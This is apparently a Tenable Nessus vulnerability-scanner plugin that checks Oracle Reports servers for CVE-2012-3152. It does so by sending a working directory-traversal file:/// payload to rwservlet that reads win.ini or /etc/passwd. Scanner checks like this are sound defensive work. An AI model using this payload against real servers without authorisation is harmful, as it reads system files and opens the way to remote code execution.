#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(73119);
  script_version("1.15");
  script_set_attribute(attribute:"plugin_modification_date", value:"2023/04/25");

  script_cve_id("CVE-2012-3152");
  script_bugtraq_id(55955);
  script_xref(name:"EDB-ID", value:"31253");
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2022/05/03");

  script_name(english:"Oracle Reports Servlet Remote File Access");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a web application that has a file access
vulnerability.");
  script_set_attribute(attribute:"description", value:
"Nessus was able to exploit a file access vulnerability in the Oracle
Reports servlet and retrieve to contents of a file.  A remote attacker
could use this vulnerability to read or write arbitrary files on the
system, ultimately leading to remote code execution.");
  # http://blog.netinfiltration.com/2013/11/03/oracle-reports-cve-2012-3152-and-cve-2012-3153/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?c969a07f");
  # https://www.oracle.com/technetwork/topics/security/cpuoct2012-1515893.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?87547c81");
  script_set_attribute(attribute:"solution", value:
"Apply the appropriate patch per the vendor's advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2012-3152");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Oracle Forms and Reports Remote Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/10/16");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/10/16");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/03/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:oracle:fusion_middleware");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2023 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("oracle_reports_detect.nbin");
  script_require_keys("www/oracle_reports");
  script_require_ports("Services/www", 8888);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("data_protection.inc");

appname = "Oracle Reports";

port = get_http_port(default:8888);

install = get_install_from_kb(
  appname:'oracle_reports',
  port:port,
  exit_on_fail:TRUE
);

vuln_script = install['dir'] + '/rwservlet';

traversal = mult_str(str:"../", nb:15);

file_list = make_list(traversal + "windows/win.ini",
                      traversal + "winnt/win.ini",
                      "c:/windows/win.ini",
                      "c:/winnt/win.ini",
                      "/etc/passwd");

exploit_request = NULL;
exploit_response = NULL;

foreach file (file_list)
{
  exploit = vuln_script + "?destype=cache&desformat=html&JOBTYPE=rwurl&URLPARAMETER=%22file:///" + file + "%22";
  res = http_send_recv3(method:"GET",
                        item:exploit,
                        port:port,
                        exit_on_fail:TRUE);

  if (
    # windows platforms
    (
      "win.ini" >< file &&
      (
       "[Mail]" >< res[2] ||
       "[fonts]" >< res[2] ||
       "; for 16-bit app support" >< res[2]
      )
    ) ||
    # *nix
    (
      "passwd" >< file &&
      res[2] =~ " root:.*:0:[01]:"
    )
  )
  {
    exploit_request = exploit;
    exploit_response = chomp(res[2]);
    break;
  }
}

if (!isnull(exploit_request))
{
  report = NULL;
  filename = NULL;
  output = NULL;
  request = NULL;
  exploit_request = build_url(port:port, qs:exploit_request);

  if (report_verbosity > 0)
  {
    report =
      '\n' + 'Nessus was able to exploit the vulnerability with the following' +
      '\n' + 'request :' +
      '\n' +
      '\n' + '  ' + exploit_request + '\n';

    if (report_verbosity > 1)
    {
      output = data_protection::redact_etc_passwd(output:exploit_response);
      filename = "win.ini";
      if ("passwd" >< file) filename = "/etc/passwd";
      request = make_list(req);
    }
  }

  security_report_v4(port:port,
                     extra:report,
                     severity:SECURITY_WARNING,
                     request:request,
                     file:filename,
                     output:output);

  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, build_url(port:port, qs:'/'));
